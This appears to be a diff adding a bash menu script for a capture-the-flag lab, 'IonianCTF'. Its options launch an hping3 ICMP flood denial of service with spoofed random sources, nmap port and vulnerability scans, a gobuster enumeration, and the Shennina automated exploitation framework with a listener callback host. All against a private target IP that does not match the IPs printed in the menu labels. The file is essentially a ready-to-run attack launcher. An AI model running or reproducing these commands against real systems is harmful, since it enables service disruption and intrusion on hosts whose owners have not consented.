@@ -1,0 +1,87 @@
+#!/bin/bash
+
+# Define the menu options
+title="IonianCTF - Command Menu"
+menu=(
+  "1. Port Scanning [sudo nmap 192.168.1.162]"
+  "2. Denial of Service [sudo hping DOS with ICMP flood to 192.168.1.162]"
+  "3. Vulnerability Scanning [sudo nmap with --script vuln]"
+  "4. Web Directory Enumeration [gobuster]"
+  "5. AI-Powered Cyber Attack"
+  "6. Exit"
+)
+
+# Function to display the menu
+display_menu() {
+  clear
+  echo -e "\e[96m$title\e[0m"
+  echo
+  for i in "${!menu[@]}"; do
+    if [ "$i" -eq "$selected" ]; then
+      echo -e "\e[93m> ${menu[$i]}\e[0m"
+    else
+      echo "  ${menu[$i]}"
+    fi
+  done
+}
+
+# Function to execute a command
+execute_command() {
+  clear
+  case "$selected" in
+    0) 
+      echo "Running sudo nmap 192.168.1.162..."
+      sudo nmap -sV -p 1-45000 192.168.56.20
+      ;;
+    1) 
+      echo "Running sudo hping DOS with ICMP flood to 192.168.1.162..."
+      sudo timeout 10s hping3 --icmp --flood -S -V --rand-source 192.168.56.20
+      ;;
+    2) 
+      echo "Running sudo nmap with vulners..."
+      sudo nmap --script vuln 192.168.56.20
+      ;;
+    3) 
+      echo "Running gobuster dir scan..."
+      gobuster -u http://192.168.56.20 -w /home/ubuntu/Downloads/rockyou.txt
+      ;;
+    4) 
+      echo "Running AI Attack - Exit with control z..."
+      sudo /home/ubuntu/Downloads/shennina/shennina.py --target 192.168.56.20 --lhost 172.17.0.1 --training-mode
+      ;;
+    5) 
+      echo "Exiting..."
+      exit 0
+      ;;
+  esac
+  echo
+  read -p "Press any key to return to the main menu..."
+}
+
+# Main script logic
+selected=0
+while true; do
+  display_menu
+
+  # Capture user input
+  read -rsn1 input
+  case "$input" in
+    $'\x1B') # Handle arrow key navigation
+      read -rsn2 -t 0.1 extra
+      if [ "$extra" == "[A" ]; then
+        ((selected--))
+        if [ "$selected" -lt 0 ]; then
+          selected=$((${#menu[@]} - 1))
+        fi
+      elif [ "$extra" == "[B" ]; then
+        ((selected++))
+        if [ "$selected" -ge "${#menu[@]}" ]; then
+          selected=0
+        fi
+      fi
+      ;;
+    "") # Enter key
+      execute_command
+      ;;
+  esac
+done
